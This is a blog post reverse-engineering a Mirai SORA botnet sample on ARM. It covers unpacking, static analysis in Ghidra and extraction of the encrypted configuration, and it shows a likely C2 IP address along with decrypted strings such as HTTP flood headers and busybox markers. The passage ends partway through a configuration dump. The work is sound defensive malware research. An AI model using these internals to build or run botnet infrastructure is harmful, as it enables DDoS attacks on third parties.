---
title: Reversing a Mirai SORA botnet variant
published: true
---

## Table of contents

* toc placeholder
{:toc}

## Introduction

The Mirai botnet emerged in 2016 by turning vulnerable IoT devices into a DDoS army. Mirai mainly targeted IoT devices with telnet enabled and weak credentials. At its peak, the botnet contained around 600k bots which were capable of delivering attacks with 600 Gbps load. In the same year the Mirai source code was leaked and is now available on [GitHub](https://github.com/jgamblin/Mirai-Source-Code) for security research. A high-quality research paper with further information about the first variant is available [here](https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-antonakakis.pdf). Since then a lot of modified variants have been observed, with the latest ones typically spreading by exploiting different CVEs. An example can be found [here](https://www.akamai.com/blog/security-research/2025-january-new-aquabot-mirai-variant-exploiting-mitel-phones).

In this post we will analyze the [latest](https://bazaar.abuse.ch/sample/ad772931b53729665b609f0aaa712e7bc3245495c85162857388cf839efbc5c2/) Mirai ARM sample from [MalwareBazaar](https://bazaar.abuse.ch/browse/tag/arm/) using Ghidra (static analysis) and Wireshark (dynamic analysis). We will also implement YARA and Suricata rules to detect the malware and Ghidra scripts to extract the encrypted configuration.

## Executive summary

The chosen [Mirai sample](https://bazaar.abuse.ch/sample/ad772931b53729665b609f0aaa712e7bc3245495c85162857388cf839efbc5c2/) is a SORA variant. Similarly to the original one, it also spreads by randomly generating IP addresses and trying to infect devices with telnet enabled and weak credentials. After a successful login via telnet, the information is reported to the C2 (command and control) server which handles loading the proper Mirai build onto the device. After infection, the new bot scans the internet with the goal of infecting additional devices. The bots can be instructed by the C2 to launch different (TCP, UDP and HTTP) flood attacks.

## Detailed analysis

Let's shorten the binary name first so it is easier to work with in the following chapters.

```
$ mv ad772931b53729665b609f0aaa712e7bc3245495c85162857388cf839efbc5c2.elf mirai.elf
```

### Hashes

```
$ md5sum < mirai.elf 
12b01f9857ad472b98616d305f51adcf  -
                                  
$ sha1sum < mirai.elf
c7c554969ecba5073d72784c4f6bce18c38a3c7b  -

$ sha256sum < mirai.elf
ad772931b53729665b609f0aaa712e7bc3245495c85162857388cf839efbc5c2  -
```

### Overview

The binary is statically linked and the section headers are stripped. The missing section headers can be an indicator of packing.

```
$ file mirai.elf
mirai.elf: ELF 32-bit LSB executable, ARM, version 1 (ARM), statically linked, no section header
```

This can be confirmed by `diec` and `strings`:

```
$ diec --entropy mirai.elf 
Total 7.94294: packed
  0|PT_LOAD(0)|0|27951|7.94632: packed
  1|PT_LOAD(0)|27951|233|6.27286: not packed
  2|PT_LOAD(1)|0|4092|7.88885: packed
  3|PT_LOAD(1)|4092|0|0: not packed
  4|PT_LOAD(1)|4092|24092|7.94026: packed
```

```
$ strings mirai.elf | grep -i upx
UPX!
$Info: This file is packed with the UPX executable packer http://upx.sf.net $
$Id: UPX 3.94 Copyright (C) 1996-2017 the UPX Team. All Rights Reserved. $
UPX!
UPX!
```

Since the author used [UPX](https://github.com/upx/upx), we can try to unpack it. If they did not use a custom UPX or damage the UPX headers, there is a good chance we can unpack it easily:

```
$ mv mirai.elf mirai-packed.elf
$ upx -d mirai-packed.elf -o mirai-unpacked.elf
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2025
UPX 5.0.0       Markus Oberhumer, Laszlo Molnar & John Reiser   Feb 20th 2025

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
[WARNING] bad b_info at 0x6d3c

[WARNING] ... recovery at 0x6d30

     69452 <-     28184   40.58%    linux/arm    mirai-unpacked.elf

Unpacked 1 file.
```

Unsurprisingly, the binary is stripped:

```
$ file mirai-unpacked.elf 
mirai-unpacked.elf: ELF 32-bit LSB executable, ARM, version 1 (ARM), statically linked, stripped
```

Some strings are available but most of them are probably encrypted and will be decrypted runtime. There is an IP address as well, possibly the C2 server.

```
$ strings mirai-unpacked.elf
...
POST /cdn-cgi/
 HTTP/1.1
User-Agent: 
Host: 
Cookie: 
http
url=
POST
154.7.253.207
0125!8 
58 '8%
...
```

[capa](https://github.com/mandiant/capa) can not help us as ARM is not supported:

```
$ capa mirai-unpacked.elf
ERROR    capa: --------------------------------------------------------------------------------         helpers.py:338
ERROR    capa:  Input file does not appear to target a supported architecture.                          helpers.py:339
ERROR    capa:                                                                                          helpers.py:340
ERROR    capa:  capa currently only supports analyzing x86 (32- and 64-bit).                            helpers.py:341
ERROR    capa: --------------------------------------------------------------------------------         helpers.py:342
```

### Static analysis (Ghidra)

The binary is stripped, so Ghidra gives names to symbols like `FUN_<address>`, `DAT_<address>`, etc. after it runs its initial analysis. During the manual analysis, some symbols (mainly functions and some global variables, e.g. encryption key) have been renamed, for example `FUN_000154e0` --> `mw_sendto`.
Since there are not many strings stored as plain text, they cannot be used to identify important functions and start tracking them in the code. Instead, we locate the main function based on its signature and start from there:

```c
int entry(undefined4 param_1)

{
...
  mw_main(in_stack_00000000,&stack0x00000004);
...
```
To make further analysis faster, the smaller functions have been identified (and renamed) first. These are mostly standard library (libc) functions (mainly syscall wrappers). `Window` --> `Functions` allows sorting the decompiled functions based on their size (1. column: name, 2. column: size in bytes).

```
...
mw_memset_zero	36
...
mw_strlen	40
...
mw_bind	44
mw_connect	44
mw_getsockname	44
mw_recv	44
mw_send	44
mw_socket	44
...
```

Tools like [BSim](https://github.com/NationalSecurityAgency/ghidra/tree/master/GhidraDocs/GhidraClass/BSim#bsim-tutorial), [FID](https://github.com/NationalSecurityAgency/ghidra/blob/master/DevGuide.md#building-fid-databases) and [BinDiff](https://github.com/google/bindiff) can speed up this procedure. The downside is that you need to have binaries with symbols, which then can be used for comparison and to identify functions. These binaries can be either those labeled during previous analysis or purposely built ones. For example, since the original Mirai code is leaked, we could build that with symbols. If no source code was available, we could use libc.a shipped with cross compiler ARM toolchains. On Ubuntu it is available here:


```
$ sudo apt install gcc-arm-linux-gnueabi -y
$ llvm-readelf --syms /usr/arm-linux-gnueabi/lib/libc.a | grep getsockname
File: /usr/arm-linux-gnueabi/lib/libc.a(getsockname.o)
     5: 00000000    28 FUNC    GLOBAL DEFAULT     1 __getsockname
     8: 00000000    28 FUNC    WEAK   DEFAULT     1 getsockname
    33: 00000000     0 NOTYPE  GLOBAL HIDDEN    UND __getsockname
    27: 00000000     0 NOTYPE  GLOBAL HIDDEN    UND __getsockname
    32: 00000000     0 NOTYPE  GLOBAL HIDDEN    UND __getsockname
     9: 00000000     0 NOTYPE  GLOBAL HIDDEN    UND __getsockname
    10: 00000000     0 NOTYPE  GLOBAL HIDDEN    UND __getsockname
   124: 00000000     0 NOTYPE  GLOBAL HIDDEN    UND __getsockname
```
#### Call graph of `mw_main` (depth: 1 level)

Call graphs are a great way to get a quick high-level overview, then the functions of interest can (and will) be thoroughly analyzed later.

```
Outgoing References - mw_main
    mw_sigemptyset
    mw_set_signal_mask
    mw_rt_sigprocmask
    mw_signal
    mw_sigtrap_handler
    mw_get_local_ip
    mw_init_encrypted_config
    mw_setup_c2_connection
    mw_seed_prng
    mw_memset_zero
    mw_xorshift128_ulong
    mw_strlen
    mw_unsigned_modulo
    mw_xorshift128_str
    mw_strcpy
    mw_prctl
    mw_decrypt_with_key
    mw_get_table_entry
    mw_write
    mw_encrypt_with_key
    mw_init_attack_table
    mw_init_killer
    mw_watchdog_handler
    mw_fork
    mw_setsid
    mw_close
    mw_scanner
    mw__newselect
    mw_signed_modulo
    mw_sleep_w
    mw_get_errno_location
    mw_recv
    mw_socket
    mw_fcntl
    mw_connect
    mw_getsockopt
    mw_send
    mw_process_c2_cmd
```

#### Encrypted configuration

To make analysis more difficult, the malware contains its configuration data encrypted. The encrypted data blocks are decrypted during runtime and re-encrypted immediately after use. Both the encryption key and the algorithm can be found in the binary. The implemented decryption script is available [here](https://github.com/gemesa/ghidra-scripts/). The encryption key [in the original code](https://github.com/jgamblin/Mirai-Source-Code/blob/3273043e1ef9c0bb41bd9fcdc5317f7b797a2a94/mirai/bot/table.c#L13) is `0xdeadbeef`. The authors of this SORA variant left in the code a lot of configuration data encrypted with the original key, but they changed the key and added additional configurations encrypted with the new key. In some places the malware tries to decrypt data encrypted with `0xdeadbeef` using the key `0xdedefbaf` which results in garbage data. For this reason some functionalities of the malware will not work properly (detailed later). It seems like this sample is a SORA fork because there are SORA strings encrypted with different keys, e.g. `1337SoraLOADER` with `0xdeadbeef`, `SORA: applet not found` and `/bin/busybox SORA` with `0xdedefbaf`.

Full configuration decrypted with `0xdedefbaf`:

```
MiraiConfigExtractorSORAArm.java> Running...
MiraiConfigExtractorSORAArm.java> located decryption function: mw_encrypt_with_key
MiraiConfigExtractorSORAArm.java> located config address: 00020e64
MiraiConfigExtractorSORAArm.java> located copy function: mw_copy
MiraiConfigExtractorSORAArm.java> located 65 referenced config blocks
MiraiConfigExtractorSORAArm.java> located 99 total config blocks
MiraiConfigExtractorSORAArm.java> referenced config blocks (.bss address - config ID - .rodata address - string (hex bytes)):
MiraiConfigExtractorSORAArm.java> 000210b4 - 0000004a - 00018098 - 5.........LV....[.....v (35 19 18 18 13 15 02 1F 19 18 4C 56 1D 13 13 06 5B 17 1A 1F 00 13 76)
MiraiConfigExtractorSORAArm.java> 000210bc - 0000004b - 000180b0 - 7.....LV....Y....Z...........Y.....]...Z...........Y...M.KFXOZ.....Y....Z\Y\M.KFXNv (37 15 15 13 06 02 4C 56 02 13 0E 02 59 1E 02 1B 1A 5A 17 06 06 1A 1F 15 17 02 1F 19 18 59 0E 1E 02 1B 1A 5D 0E 1B 1A 5A 17 06 06 1A 1F 15 17 02 1F 19 18 59 0E 1B 1A 4D 07 4B 46 58 4F 5A 1F 1B 17 11 13 59 01 13 14 06 5A 5C 59 5C 4D 07 4B 46 58 4E 76)
MiraiConfigExtractorSORAArm.java> 000210c4 - 0000004c - 00018104 - 7.....[:.......LV..[#%Z..M.KFXNv (37 15 15 13 06 02 5B 3A 17 18 11 03 17 11 13 4C 56 13 18 5B 23 25 5A 13 18 4D 07 4B 46 58 4E 76)
MiraiConfigExtractorSORAArm.java> 000210cc - 0000004d - 00018128 - 5......["...LV...........Y.[...[....[..........v (35 19 18 02 13 18 02 5B 22 0F 06 13 4C 56 17 06 06 1A 1F 15 17 02 1F 19 18 59 0E 5B 01 01 01 5B 10 19 04 1B 5B 03 04 1A 13 18 15 19 12 13 12 76)
MiraiConfigExtractorSORAArm.java> 00020ecc - 0000000d - 00017d78 - /proc/. (2F 70 72 6F 63 2F 00)
MiraiConfigExtractorSORAArm.java> 00020ed4 - 0000000e - 00017d80 - /exe. (2F 65 78 65 00)
MiraiConfigExtractorSORAArm.java> 00020f54 - 0000001e - 00017dbc - .anime. (2E 61 6E 69 6D 65 00)
MiraiConfigExtractorSORAArm.java> 00020f64 - 00000020 - 00017e60 - ...>.....v (12 00 04 3E 13 1A 06 13 04 76)
MiraiConfigExtractorSORAArm.java> 00020f6c - 00000021 - 00017e6c - 8.11.$@O..v (38 1F 31 31 13 24 40 4F 0E 12 76)
MiraiConfigExtractorSORAArm.java> 00020f74 - 00000022 - 00017e78 - GEEA%...:9723$v (47 45 45 41 25 19 04 17 3A 39 37 32 33 24 76)
MiraiConfigExtractorSORAArm.java> 00020f7c - 00000023 - 00017e88 - 8.11.$.F...GEEAv (38 1F 31 31 13 24 12 46 18 1D 05 47 45 45 41 76)
MiraiConfigExtractorSORAArm.java> 00020f84 - 00000024 - 00017e9c - .GO?DEOGDB#?#v (2E 47 4F 3F 44 45 4F 47 44 42 23 3F 23 76)
MiraiConfigExtractorSORAArm.java> 00020f8c - 00000025 - 00017eac - ?./....?..vTGB0.v (3F 03 2F 11 03 1C 13 3F 07 18 76 54 47 42 30 17 76)
MiraiConfigExtractorSORAArm.java> 00020f94 - 00000026 - 00017eb8 - GB0.v (47 42 30 17 76)
MiraiConfigExtractorSORAArm.java> 00020f9c - 00000027 - 00017ec0 - ..72v (15 15 37 32 76)
MiraiConfigExtractorSORAArm.java> 00020fb4 - 0000002a - 00017ec8 - Y....Y...Y.....v (59 06 04 19 15 59 18 13 02 59 04 19 03 02 13 76)
MiraiConfigExtractorSORAArm.java> 00020fbc - 0000002b - 00017edc - Y....Y.......v (59 06 04 19 15 59 15 06 03 1F 18 10 19 76)
MiraiConfigExtractorSORAArm.java> 00020fc4 - 0000002c - 00017eec - 4919;?&%v (34 39 31 39 3B 3F 26 25 76)
MiraiConfigExtractorSORAArm.java> 00020fcc - 0000002d - 00017ef8 - Y...Y..X.Y..X.....v (59 13 02 15 59 04 15 58 12 59 04 15 58 1A 19 15 17 1A 76)
MiraiConfigExtractorSORAArm.java> 00020fd4 - 0000002e - 00017f0c - .G...B...EC...D...F...v (11 47 17 14 15 42 12 1B 19 45 43 1E 18 06 44 1A 1F 13 46 1D 1C 10 76)
MiraiConfigExtractorSORAArm.java> 00020fdc - 0000002f - 00017f24 - Y...Y........v (59 12 13 00 59 01 17 02 15 1E 12 19 11 76)
MiraiConfigExtractorSORAArm.java> 00020fe4 - 00000030 - 00017f34 - Y...Y....Y........v (59 12 13 00 59 1B 1F 05 15 59 01 17 02 15 1E 12 19 11 76)
MiraiConfigExtractorSORAArm.java> 00020fec - 00000031 - 00017f48 - Y...Y0"!2"GFG)........v (59 12 13 00 59 30 22 21 32 22 47 46 47 29 01 17 02 15 1E 12 19 11 76)
MiraiConfigExtractorSORAArm.java> 00020ff4 - 00000032 - 00017f60 - Y...Y........Yv (59 12 13 00 59 18 13 02 05 1A 1F 18 1D 59 76)
MiraiConfigExtractorSORAArm.java> 00020ffc - 00000033 - 00017f70 - &$? ;%1v (26 24 3F 20 3B 25 31 76)
MiraiConfigExtractorSORAArm.java> 00021004 - 00000034 - 00017f7c - 13":957:?&vT=?::7 (31 33 22 3A 39 35 37 3A 3F 26 76 54 3D 3F 3A 3A 37)
MiraiConfigExtractorSORAArm.java> 0002100c - 00000035 - 00017f88 - =?::7""=v (3D 3F 3A 3A 37 22 22 3D 76)
MiraiConfigExtractorSORAArm.java> 00021014 - 00000036 - 00017f94 - 3...Nv (33 17 02 05 4E 76)
MiraiConfigExtractorSORAArm.java> 0002101c - 00000037 - 00017f9c - .-F.v (00 2D 46 00 76)
MiraiConfigExtractorSORAArm.java> 0002102c - 00000039 - 00017fa4 - OE9..>,D.v (4F 45 39 10 1C 3E 2C 44 0C 76)
MiraiConfigExtractorSORAArm.java> 0002103c - 0000003b - 00017fc4 - !.17B60@0v (21 05 31 37 42 36 30 40 30 76)
MiraiConfigExtractorSORAArm.java> 00021044 - 0000003c - 00017fd0 - 7524v (37 35 32 34 76)
MiraiConfigExtractorSORAArm.java> 0002104c - 0000003d - 00017fd8 - 7.7.v (37 14 37 12 76)
MiraiConfigExtractorSORAArm.java> 00021054 - 0000003e - 00017fe0 - ..1.v (1F 17 31 00 76)
MiraiConfigExtractorSORAArm.java> 00021034 - 0000003a - 00017fb0 - 1....!..>...@@@ (31 1E 19 05 02 21 03 0C 3E 13 04 13 40 40 40)
MiraiConfigExtractorSORAArm.java> 00020f44 - 0000001c - 00017e48 - 1gba4cdom53nhp12ei0kfj. (31 67 62 61 34 63 64 6F 6D 35 33 6E 68 70 31 32 65 69 30 6B 66 6A 00)
MiraiConfigExtractorSORAArm.java> 0002119c - 00000067 - 00018788 - ;......YCXFV^!......V8"VGFXFMV!..@BMV.@B_V7....!..=..YCEAXE@V^=>";:ZV....V1...._V5.....Y@DXFXEDFDXOBv (3B 19 0C 1F 1A 1A 17 59 43 58 46 56 5E 21 1F 18 12 19 01 05 56 38 22 56 47 46 58 46 4D 56 21 1F 18 40 42 4D 56 0E 40 42 5F 56 37 06 06 1A 13 21 13 14 3D 1F 02 59 43 45 41 58 45 40 56 5E 3D 3E 22 3B 3A 5A 56 1A 1F 1D 13 56 31 13 15 1D 19 5F 56 35 1E 04 19 1B 13 59 40 44 58 46 58 45 44 46 44 58 4F 42 76)
MiraiConfigExtractorSORAArm.java> 0002112c - 00000059 - 00018208 - ;......YCXFV^!......V8"VGFXFMV!9!@B_V7....!..=..YCEAXE@V^=>";:ZV....V1...._V5.....YCGXFXDAFBXGFEV%.....YCEAXE@v (3B 19 0C 1F 1A 1A 17 59 43 58 46 56 5E 21 1F 18 12 19 01 05 56 38 22 56 47 46 58 46 4D 56 21 39 21 40 42 5F 56 37 06 06 1A 13 21 13 14 3D 1F 02 59 43 45 41 58 45 40 56 5E 3D 3E 22 3B 3A 5A 56 1A 1F 1D 13 56 31 13 15 1D 19 5F 56 35 1E 04 19 1B 13 59 43 47 58 46 58 44 41 46 42 58 47 46 45 56 25 17 10 17 04 1F 59 43 45 41 58 45 40 76)
MiraiConfigExtractorSORAArm.java> 00021134 - 0000005a - 00018278 - ;......YCXFV^!......V8"VGFXFMV!9!@B_V7....!..=..YCEAXE@V^=>";:ZV....V1...._V5.....YCDXFXDABEXGG@V%.....YCEAXE@v (3B 19 0C 1F 1A 1A 17 59 43 58 46 56 5E 21 1F 18 12 19 01 05 56 38 22 56 47 46 58 46 4D 56 21 39 21 40 42 5F 56 37 06 06 1A 13 21 13 14 3D 1F 02 59 43 45 41 58 45 40 56 5E 3D 3E 22 3B 3A 5A 56 1A 1F 1D 13 56 31 13 15 1D 19 5F 56 35 1E 04 19 1B 13 59 43 44 58 46 58 44 41 42 45 58 47 47 40 56 25 17 10 17 04 1F 59 43 45 41 58 45 40 76)
MiraiConfigExtractorSORAArm.java> 0002113c - 0000005b - 000182e8 - ;......YCXFV^!......V8"V@XGMV!9!@B_V7....!..=..YCEAXE@V^=>";:ZV....V1...._V5.....YCGXFXDAFBXGFEV%.....YCEAXE@vT (3B 19 0C 1F 1A 1A 17 59 43 58 46 56 5E 21 1F 18 12 19 01 05 56 38 22 56 40 58 47 4D 56 21 39 21 40 42 5F 56 37 06 06 1A 13 21 13 14 3D 1F 02 59 43 45 41 58 45 40 56 5E 3D 3E 22 3B 3A 5A 56 1A 1F 1D 13 56 31 13 15 1D 19 5F 56 35 1E 04 19 1B 13 59 43 47 58 46 58 44 41 46 42 58 47 46 45 56 25 17 10 17 04 1F 59 43 45 41 58 45 40 76 54)
MiraiConfigExtractorSORAArm.java> 00021144 - 0000005c - 00018358 - ;......YCXFV^!......V8"V@XGMV!9!@B_V7....!..=..YCEAXE@V^=>";:ZV....V1...._V5.....YCDXFXDABEXGG@V%.....YCEAXE@vT (3B 19 0C 1F 1A 1A 17 59 43 58 46 56 5E 21 1F 18 12 19 01 05 56 38 22 56 40 58 47 4D 56 21 39 21 40 42 5F 56 37 06 06 1A 13 21 13 14 3D 1F 02 59 43 45 41 58 45 40 56 5E 3D 3E 22 3B 3A 5A 56 1A 1F 1D 13 56 31 13 15 1D 19 5F 56 35 1E 04 19 1B 13 59 43 44 58 46 58 44 41 42 45 58 47 47 40 56 25 17 10 17 04 1F 59 43 45 41 58 45 40 76 54)
MiraiConfigExtractorSORAArm.java> 0002114c - 0000005d - 000183c8 - ;......YCXFV^;........MV?....V;..V9%V.VGF)GG)@_V7....!..=..Y@FGXAXAV^=>";:ZV....V1...._V ......YOXGXDV%.....Y@FGXAXAv (3B 19 0C 1F 1A 1A 17 59 43 58 46 56 5E 3B 17 15 1F 18 02 19 05 1E 4D 56 3F 18 02 13 1A 56 3B 17 15 56 39 25 56 2E 56 47 46 29 47 47 29 40 5F 56 37 06 06 1A 13 21 13 14 3D 1F 02 59 40 46 47 58 41 58 41 56 5E 3D 3E 22 3B 3A 5A 56 1A 1F 1D 13 56 31 13 15 1D 19 5F 56 20 13 04 05 1F 19 18 59 4F 58 47 58 44 56 25 17 10 17 04 1F 59 40 46 47 58 41 58 41 76)
MiraiConfigExtractorSORAArm.java> 00021154 - 0000005e - 00018440 - ;......YBXFV^..........MV;%?3VOXFMV!......V8"VCXGMV"......YCXF_v (3B 19 0C 1F 1A 1A 17 59 42 58 46 56 5E 15 19 1B 06 17 02 1F 14 1A 13 4D 56 3B 25 3F 33 56 4F 58 46 4D 56 21 1F 18 12 19 01 05 56 38 22 56 43 58 47 4D 56 22 04 1F 12 13 18 02 59 43 58 46 5F 76)
MiraiConfigExtractorSORAArm.java> 0002115c - 0000005f - 00018484 - ;......YBXFV^..........MV;%?3VOXFMV!......V8"V@XFMV"......YBXFMV1"4AXBMV?...&...XEMV% GMVX83"V5:$VEXBXCEE@FMV!9!@BMV..[#%_v (3B 19 0C 1F 1A 1A 17 59 42 58 46 56 5E 15 19 1B 06 17 02 1F 14 1A 13 4D 56 3B 25 3F 33 56 4F 58 46 4D 56 21 1F 18 12 19 01 05 56 38 22 56 40 58 46 4D 56 22 04 1F 12 13 18 02 59 42 58 46 4D 56 31 22 34 41 58 42 4D 56 3F 18 10 19 26 17 02 1E 58 45 4D 56 25 20 47 4D 56 58 38 33 22 56 35 3A 24 56 45 58 42 58 43 45 45 40 46 4D 56 21 39 21 40 42 4D 56 13 18 5B 23 25 5F 76)
MiraiConfigExtractorSORAArm.java> 00021164 - 00000060 - 00018500 - ;......YBXFV^..........MV;%?3VOXFMV!......V8"V@XGMV"......YBXFMV02;MV;%?35......MV;....V5.....V&5VCXF_v (3B 19 0C 1F 1A 1A 17 59 42 58 46 56 5E 15 19 1B 06 17 02 1F 14 1A 13 4D 56 3B 25 3F 33 56 4F 58 46 4D 56 21 1F 18 12 19 01 05 56 38 22 56 40 58 47 4D 56 22 04 1F 12 13 18 02 59 42 58 46 4D 56 30 32 3B 4D 56 3B 25 3F 33 35 04 17 01 1A 13 04 4D 56 3B 13 12 1F 17 56 35 13 18 02 13 04 56 26 35 56 43 58 46 5F 76)
MiraiConfigExtractorSORAArm.java> 0002116c - 00000061 - 00018568 - ;......YBXFV^..........MV;%?3VOXFMV!......V8"V@XGMV"......YBXFMV1"4AXBMV?...&...XDMV% GMVX83"V5:$VBXBXCNAOOMV!9!@BMV..[#%_v (3B 19 0C 1F 1A 1A 17 59 42 58 46 56 5E 15 19 1B 06 17 02 1F 14 1A 13 4D 56 3B 25 3F 33 56 4F 58 46 4D 56 21 1F 18 12 19 01 05 56 38 22 56 40 58 47 4D 56 22 04 1F 12 13 18 02 59 42 58 46 4D 56 31 22 34 41 58 42 4D 56 3F 18 10 19 26 17 02 1E 58 44 4D 56 25 20 47 4D 56 58 38 33 22 56 35 3A 24 56 42 58 42 58 43 4E 41 4F 4F 4D 56 21 39 21 40 42 4D 56 13 18 5B 23 25 5F 76)
MiraiConfigExtractorSORAArm.java> 00021174 - 00000062 - 000185e4 - ;......YBXFV^..........MV;%?3VOXFMV!......V8"V@XGMV"......YCXFMV0..!..&......._v (3B 19 0C 1F 1A 1A 17 59 42 58 46 56 5E 15 19 1B 06 17 02 1F 14 1A 13 4D 56 3B 25 3F 33 56 4F 58 46 4D 56 21 1F 18 12 19 01 05 56 38 22 56 40 58 47 4D 56 22 04 1F 12 13 18 02 59 43 58 46 4D 56 30 03 18 21 13 14 26 04 19 12 03 15 02 05 5F 76)
MiraiConfigExtractorSORAArm.java> 0002117c - 00000063 - 00018638 - ;......YCXFV^;........MV?....V;..V9%V.VGFX@MV..LDCXF_V1....YDFGFFGFGV0......YDCXFv (3B 19 0C 1F 1A 1A 17 59 43 58 46 56 5E 3B 17 15 1F 18 02 19 05 1E 4D 56 3F 18 02 13 1A 56 3B 17 15 56 39 25 56 2E 56 47 46 58 40 4D 56 04 00 4C 44 43 58 46 5F 56 31 13 15 1D 19 59 44 46 47 46 46 47 46 47 56 30 1F 04 13 10 19 0E 59 44 43 58 46 76)
MiraiConfigExtractorSORAArm.java> 00021184 - 00000064 - 0001868c - ;......YCXFV^;........MV?....V;..V9%V.VGFXNMV..LDGXF_V1....YDFGFFGFGV0......YDGXFv (3B 19 0C 1F 1A 1A 17 59 43 58 46 56 5E 3B 17 15 1F 18 02 19 05 1E 4D 56 3F 18 02 13 1A 56 3B 17 15 56 39 25 56 2E 56 47 46 58 4E 4D 56 04 00 4C 44 47 58 46 5F 56 31 13 15 1D 19 59 44 46 47 46 46 47 46 47 56 30 1F 04 13 10 19 0E 59 44 47 58 46 76)
MiraiConfigExtractorSORAArm.java> 0002118c - 00000065 - 000186e0 - ;......YCXFV^;........MV?....V;..V9%V.VGFXNMV..LDBXF_V1....YDFGFFGFGV0......YDBXFv (3B 19 0C 1F 1A 1A 17 59 43 58 46 56 5E 3B 17 15 1F 18 02 19 05 1E 4D 56 3F 18 02 13 1A 56 3B 17 15 56 39 25 56 2E 56 47 46 58 4E 4D 56 04 00 4C 44 42 58 46 5F 56 31 13 15 1D 19 59 44 46 47 46 46 47 46 47 56 30 1F 04 13 10 19 0E 59 44 42 58 46 76)
MiraiConfigExtractorSORAArm.java> 00021194 - 00000066 - 00018734 - ;......YCXFV^;........MV?....V;..V9%V.VGF)GFMV..LEEXF_V1....YDFGFFGFGV0......YEEXFv (3B 19 0C 1F 1A 1A 17 59 43 58 46 56 5E 3B 17 15 1F 18 02 19 05 1E 4D 56 3F 18 02 13 1A 56 3B 17 15 56 39 25 56 2E 56 47 46 29 47 46 4D 56 04 00 4C 45 45 58 46 5F 56 31 13 15 1D 19 59 44 46 47 46 46 47 46 47 56 30 1F 04 13 10 19 0E 59 45 45 58 46 76)
MiraiConfigExtractorSORAArm.java> 00020f34 - 0000001a - 00017e38 - ogin. (6F 67 69 6E 00)
MiraiConfigExtractorSORAArm.java> 00020f3c - 0000001b - 00017e40 - enter. (65 6E 74 65 72 00)
MiraiConfigExtractorSORAArm.java> 00020f2c - 00000019 - 00017e2c - pbbf~cu. (70 62 62 66 7E 63 75 11)
MiraiConfigExtractorSORAArm.java> 00020e8c - 00000005 - 00017d00 - enable. (65 6E 61 62 6C 65 00)
MiraiConfigExtractorSORAArm.java> 00020e94 - 00000006 - 00017d08 - system. (73 79 73 74 65 6D 00)
MiraiConfigExtractorSORAArm.java> 00020e9c - 00000007 - 00017d10 - sh. (73 68 00)
MiraiConfigExtractorSORAArm.java> 00020e84 - 00000004 - 00017cf8 - shell. (73 68 65 6C 6C 00)
MiraiConfigExtractorSORAArm.java> 00020eb4 - 0000000a - 00017d40 - ncorrect. (6E 63 6F 72 72 65 63 74 00)
MiraiConfigExtractorSORAArm.java> 00020eac - 00000009 - 00017d28 - SORA: applet not found. (53 4F 52 41 3A 20 61 70 70 6C 65 74 20 6E 6F 74 20 66 6F 75 6E 64 00)
MiraiConfigExtractorSORAArm.java> 00020ea4 - 00000008 - 00017d14 - /bin/busybox SORA. (2F 62 69 6E 2F 62 75 73 79 62 6F 78 20 53 4F 52 41 00)
MiraiConfigExtractorSORAArm.java> 00020e7c - 00000003 - 000187f0 - Connected To CNC. (43 6F 6E 6E 65 63 74 65 64 20 54 6F 20 43 4E 43 00)
MiraiConfigExtractorSORAArm.java> 00020f1c - 00000017 - 00017e08 - /dev/watchdog. (2F 64 65 76 2F 77 61 74 63 68 64 6F 67 00)
MiraiConfigExtractorSORAArm.java> 00020f24 - 00000018 - 00017e18 - /dev/misc/watchdog. (2F 64 65 76 2F 6D 69 73 63 2F 77 61 74 63 68 64 6F 67 00)
MiraiConfigExtractorSORAArm.java> 00020e6c - 00000001 - 00017cf0 - .  (05 20)
MiraiConfigExtractorSORAArm.java> Finished!
```

Full configuration decrypted with `0xdeadbeef`:

```
MiraiConfigExtractorSORAArm.java> Running...
MiraiConfigExtractorSORAArm.java> located decryption function: mw_encrypt_with_key
MiraiConfigExtractorSORAArm.java> located config address: 00020e64
MiraiConfigExtractorSORAArm.java> located copy function: mw_copy
MiraiConfigExtractorSORAArm.java> located 65 referenced config blocks
MiraiConfigExtractorSORAArm.java> located 99 total config blocks
MiraiConfigExtractorSORAArm.java> referenced config blocks (.bss address - config ID - .rodata address - string (hex bytes)):
MiraiConfigExtractorSORAArm.java> 000210b4 - 0000004a - 00018098 - Connection: keep-alive. (43 6F 6E 6E 65 63 74 69 6F 6E 3A 20 6B 65 65 70 2D 61 6C 69 76 65 00)
MiraiConfigExtractorSORAArm.java> 000210bc - 0000004b - 000180b0 - Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8. (41 63 63 65 70 74 3A 20 74 65 78 74 2F 68 74 6D 6C 2C 61 70 70 6C 69 63 61 74 69 6F 6E 2F 78 68 74 6D 6C 2B 78 6D 6C 2C 61 70 70 6C 69 63 61 74 69 6F 6E 2F 78 6D 6C 3B 71 3D 30 2E 39 2C 69 6D 61 67 65 2F 77 65 62 70 2C 2A 2F 2A 3B 71 3D 30 2E 38 00)
MiraiConfigExtractorSORAArm.java> 000210c4 - 0000004c - 00018104 - Accept-Language: en-US,en;q=0.8. (41 63 63 65 70 74 2D 4C 61 6E 67 75 61 67 65 3A 20 65 6E 2D 55 53 2C 65 6E 3B 71 3D 30 2E 38 00)
MiraiConfigExtractorSORAArm.java> 000210cc - 0000004d - 00018128 - Content-Type: application/x-www-form-urlencoded. (43 6F 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 00)
MiraiConfigExtractorSORAArm.java> 00020ecc - 0000000d - 00017d78 - Y....Yv (59 06 04 19 15 59 76)
MiraiConfigExtractorSORAArm.java> 00020ed4 - 0000000e - 00017d80 - Y...v (59 13 0E 13 76)
MiraiConfigExtractorSORAArm.java> 00020f54 - 0000001e - 00017dbc - X.....v (58 17 18 1F 1B 13 76)
MiraiConfigExtractorSORAArm.java> 00020f64 - 00000020 - 00017e60 - dvrHelper. (64 76 72 48 65 6C 70 65 72 00)
MiraiConfigExtractorSORAArm.java> 00020f6c - 00000021 - 00017e6c - <censored>
MiraiConfigExtractorSORAArm.java> 00020f74 - 00000022 - 00017e78 - 1337SoraLOADER. (31 33 33 37 53 6F 72 61 4C 4F 41 44 45 52 00)
MiraiConfigExtractorSORAArm.java> 00020f7c - 00000023 - 00017e88 - <censored>
